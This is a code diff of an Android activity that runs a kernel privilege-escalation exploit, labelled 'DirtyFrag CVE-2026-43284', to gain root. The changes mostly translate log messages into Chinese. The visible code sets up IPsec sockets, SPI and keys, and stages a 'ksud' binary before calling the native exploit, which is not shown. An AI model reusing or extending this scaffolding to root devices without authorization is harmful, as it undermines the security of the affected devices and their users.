@@ -76,8 +76,8 @@ public class MainActivity extends AppCompatActivity implements IReporter {
     private void runExploit() {
         try {
             log(DeviceCheck.report());
-            if (!DeviceCheck.preflight("manual")) {
-                log("\npreflight FAILED: required paths missing - nothing was patched.");
+            if (!DeviceCheck.preflight("手动运行")) {
+                log("\n自检未通过：依赖路径缺失 —— 没有修改任何文件，已中止。");
                 return;
             }
 
@@ -85,13 +85,13 @@ public class MainActivity extends AppCompatActivity implements IReporter {
 
             IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
             int encapPort = encapSock.getPort();
-            log("encap port: " + encapPort);
+            log("IPSec 封装端口: " + encapPort);
 
             InetAddress loopback = InetAddress.getByName("127.0.0.1");
             IpSecManager.SecurityParameterIndex spiObj =
                     ipsec.allocateSecurityParameterIndex(loopback);
             int spiVal = spiObj.getSpi();
-            log("spi: 0x" + Integer.toHexString(spiVal));
+            log("SPI: 0x" + Integer.toHexString(spiVal));
 
             SecureRandom rng = new SecureRandom();
             byte[] aesKey  = new byte[32]; rng.nextBytes(aesKey);
@@ -111,8 +111,8 @@ public class MainActivity extends AppCompatActivity implements IReporter {
                     .buildTransportModeTransform(loopback, spiObj);
 
             stageAsset(this, "ksud", true, getFilesDir());
-            log("ksud staged to: " + new File(getFilesDir(), "ksud").getAbsolutePath());
-            log("running native exploit...");
+            log("ksud 已暂存到: " + new File(getFilesDir(), "ksud").getAbsolutePath());
+            log("开始执行漏洞利用……");
 
             int icvLen = 128 / 8;
             String ksudPath = new File(getFilesDir(), "ksud").getAbsolutePath();
@@ -124,11 +124,11 @@ public class MainActivity extends AppCompatActivity implements IReporter {
 
         } catch (Exception e) {
             Log.e(TAG, "exploit exception", e);
-            log("\nexception: " + e);
+            log("\n发生异常: " + e);
         } finally {
             mMain.post(() -> {
                 binding.btnRun.setEnabled(true);
-                binding.btnRun.setText("Launch Root (DirtyFrag CVE-2026-43284)");
+                binding.btnRun.setText(R.string.btn_run);
             });
         }
     }
